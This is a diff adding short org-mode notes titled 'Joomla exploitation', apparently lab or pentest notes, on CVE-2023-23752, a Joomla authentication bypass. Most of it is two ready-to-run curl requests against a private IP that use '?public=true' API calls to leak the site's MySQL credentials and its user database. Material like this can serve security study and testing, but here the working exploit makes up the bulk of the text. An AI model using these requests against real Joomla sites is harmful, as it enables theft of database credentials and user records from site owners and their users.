@@ -1,0 +1,14 @@
+#+title: Joomla exploitation
+#+author: gabriel
+
+
+CVE-2023-23752 to Code Execution #1
+As discussed, CVE-2023-23752 is an authentication bypass resulting in an information leak. Most of the public exploits use the bypass to leak the system's configuration, which contains the Joomla! MySQL database credentials in plaintext. The following demonstrates the leak:
+: curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true
+
+
+
+CVE-2023-23752 to Code Execution #2
+Instead of leaking the MySQL credentials, the attacker can leak the Joomla! user database using CVE-2023-23752:
+
+: curl -v http://10.9.49.205/api/index.php/v1/users?public=true
